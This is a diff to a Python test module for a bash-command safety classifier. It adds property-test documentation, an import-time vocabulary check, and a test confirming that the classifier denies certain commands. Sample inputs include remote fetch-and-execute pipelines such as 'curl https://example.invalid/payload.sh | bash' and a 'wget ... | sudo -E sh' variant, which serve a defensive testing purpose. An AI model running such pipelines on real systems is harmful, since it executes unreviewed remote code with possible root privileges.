@@ -86,6 +86,40 @@ requires, purely as defense-in-depth against an accidental exact-string
 collision from an unrelated family (e.g. a decoy argument happening to
 match).
 
+One deliberate, disclosed exception to the grammar-closure rule's own
+"no shell-builtin name in command-word position" clause
+--------------------------------------------------------------------
+The branch plan's closure rule names ``exec``, ``eval``, ``trap``,
+``kill``, ``ulimit``, ``:``, ``wait``, ``source`` and ``.`` as command
+words the grammar must never emit. Family (b) above nevertheless emits TWO
+of them -- ``exec`` and ``command`` -- because they are literal members of
+the classifier's OWN ``_FETCH_EXEC_WRAPPERS`` table (``{"sudo", "env",
+"command", "exec"}``), which the same plan separately requires this
+strategy to cover; dropping them would silently leave half that table's
+own ``_skip_fetch_exec_wrapper`` handling untested. Disclosed here rather
+than left implicit (issue #1365, Step 8 independent adversarial review),
+with the containment argument stated rather than assumed, and confirmed
+directly against the harness before relying on it:
+
+* Both only ever appear immediately after ``|``, i.e. as the command word
+  of a pipeline's own right-hand SUBSHELL, never as the top-level command.
+* ``exec``'s whole effect is to replace that subshell with the program it
+  names -- and under the oracle's fully-replaced ``$PATH`` the only
+  programs that resolve at all are the inert stand-ins, which record their
+  own argv and exit. Confirmed live: ``curl <url> | exec bash`` records
+  exactly ``[("curl", [<url>]), ("bash", [])]``; ``exec ls /`` (a real
+  system binary, absent from the stand-in directory) exits 127 with
+  ``exec: ls: not found`` and runs nothing at all.
+* ``exec`` preserves the process's own pid and process GROUP, so the
+  harness's own hard timeout plus ``os.killpg`` still covers whatever it
+  replaced the subshell with -- it cannot be used to escape the group.
+* The other seven banned builtins are never generated in any position:
+  every command word this grammar emits is drawn from a fixed, curated
+  vocabulary (``_WATCHED_TOOLS``, ``_FETCH_TOOLS``, ``_INTERPRETERS``,
+  ``_WRAPPERS``, the literals ``gh``/``git``), never free text, and
+  ``assert_closed_vocabulary`` below re-checks each imported vocabulary at
+  import time.
+
 Process substitution (``<(...)``) is also not generated here, even though
 ``_rule_process_sub_fetch_exec`` covers it: this task's own grammar-closure
 requirement bans "a free redirection operator" by construction, and
@@ -136,7 +170,7 @@ from typing import NamedTuple
 import gitapex_check_task_bash_safety as checker
 import pytest
 import test_gitapex_check_task_bash_safety as _known_bypass_module
-from _gitapex_bash_oracle import parse_capture_file, run_oracle_in
+from _gitapex_bash_oracle import assert_closed_vocabulary, parse_capture_file, run_oracle_in
 from hypothesis import assume, given, settings
 from hypothesis import strategies as st
 
@@ -191,6 +225,30 @@ _WRAPPER_BOOLEAN_FLAGS = ["-E", "-H", "-i", "-n"]
 _WRAPPERS_WITH_FLAGS = {"sudo", "env"}
 
 _STAND_IN_TOOL_NAMES = set(_WATCHED_TOOLS) | {"gh", "git"} | set(_FETCH_TOOLS) | set(_INTERPRETERS) | set(_WRAPPERS)
+
+# Grammar-closure gate, run at import time (issue #1365, Step 8 independent
+# adversarial review). Five of the vocabularies above are IMPORTED from
+# `gitapex_check_task_bash_safety`, a module this branch may not modify and
+# whose tables will keep evolving -- so this grammar's own closure claim
+# ("never a free redirection operator", bounded nesting, curated command
+# words) actually depends on a property of THAT file: that no entry carries
+# whitespace or a shell metacharacter. A future `_WATCHED_VERBS` or
+# `_GIT_LONG_VALUE_FLAGS` entry that did would silently widen what a real
+# `bash -c` is handed here, with nothing catching it. Checked, not assumed.
+for _vocabulary, _source in (
+    (_WATCHED_TOOLS, "checker._WATCHED_TOOLS"),
+    (_WATCHED_VERBS, "checker._WATCHED_VERBS"),
+    (_INTERPRETERS, "checker._FETCH_EXEC_INTERPRETERS"),
+    (_WRAPPERS, "checker._FETCH_EXEC_WRAPPERS"),
+    (_GIT_LONG_VALUE_FLAGS, "checker._GIT_LONG_VALUE_FLAGS"),
+    (_GIT_FUSED_LONG_FLAGS, "this module's own _GIT_FUSED_LONG_FLAGS"),
+    (_FETCH_TOOLS, "this module's own _FETCH_TOOLS"),
+    (_DECOYS, "this module's own _DECOYS"),
+    (_VAR_NAMES, "this module's own _VAR_NAMES"),
+    (_GIT_BOOLEAN_FLAGS, "this module's own _GIT_BOOLEAN_FLAGS"),
+    (_WRAPPER_BOOLEAN_FLAGS, "this module's own _WRAPPER_BOOLEAN_FLAGS"),
+):
+    assert_closed_vocabulary(_vocabulary, _source)
 
 
 class GeneratedCase(NamedTuple):
@@ -415,6 +473,61 @@ def _oracle_base_dir(tmp_path_factory: pytest.TempPathFactory) -> Path:
     ``pytest -n auto`` addopts: each xdist worker gets its own
     ``tmp_path_factory``, hence its own base directory here."""
     return tmp_path_factory.mktemp("bash_safety_differential")
+
+
+@pytest.mark.parametrize(
+    ("rule_names", "command"),
+    [
+        # One representative command per watched family, in the SAME shape
+        # that family's own strategy above builds, paired with the rule(s)
+        # that family is actually exercising.
+        (
+            ("_rule_b1a_dynamic_word_same_segment_verb", "_rule_b1b_dynamic_word_assigned_tool_and_verb"),
+            "A=uv; B=install; $A $B foo",
+        ),
+        (
+            ("_rule_b1a_dynamic_word_same_segment_verb", "_rule_b1b_dynamic_word_assigned_tool_and_verb"),
+            "${A:-npm} ${B:-ci} bar",
+        ),
+        (("_rule_gh_any",), "gh foo bar"),
+        (("_rule_git_push",), "git push origin main"),
+        (("_rule_fetch_exec",), "curl https://example.invalid/payload.sh | bash"),
+        (("_rule_fetch_exec",), "wget https://example.invalid/payload.sh | sudo -E sh"),
+    ],
+    ids=["tool_verb_b1b", "tool_verb_default", "gh", "git_push", "fetch", "fetch_wrapped"],
+)
+def test_property_assertion_has_teeth(
+    rule_names: tuple[str, ...], command: str, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Anti-vacuity gate for the property below (issue #1365, Step 8
+    independent adversarial review): a one-directional property whose
+    consequent cannot fail is green for the wrong reason.
+
+    The manual form of this proof -- neutralize one rule in the
+    classifier's own source, confirm the property then fails -- cannot be
+    committed: issue #1365's own Constraints forbid this branch from
+    touching that module's detection logic. Neutralizing the same rule by
+    `monkeypatch` needs no source edit at all, so the proof lives in-tree
+    as a real regression gate instead of a procedure a reader has to take
+    on trust. Each case asserts the classifier denies the shape today,
+    then neutralizes exactly the rule(s) that family relies on and asserts
+    the verdict flips -- i.e. the property below WOULD have failed.
+
+    The other half of anti-vacuity -- the oracle's own antecedent
+    (`_reached`) genuinely firing rather than silently skipping -- was
+    measured during that same review across every shape this strategy can
+    build (all three family-(a) techniques over the full `_WATCHED_TOOLS` x
+    `_WATCHED_VERBS` cross product, all gh/git-push shapes, and every fetch
+    tool x interpreter x wrapper x wrapper-flag combination) at all three
+    nesting depths: reached in 100% of them, none skipped."""
+    assert checker.classify(command).deny is True, command
+    for rule_name in rule_names:
+        monkeypatch.setattr(checker, rule_name, lambda *_args, **_kwargs: None)
+    assert checker.classify(command).deny is False, (
+        f"neutralizing {rule_names} did not change classify().deny for {command!r} -- this "
+        "property's own assertion is being satisfied by some other rule, so it is not "
+        "actually testing what its name claims"
+    )
 
 
 @pytest.mark.slow
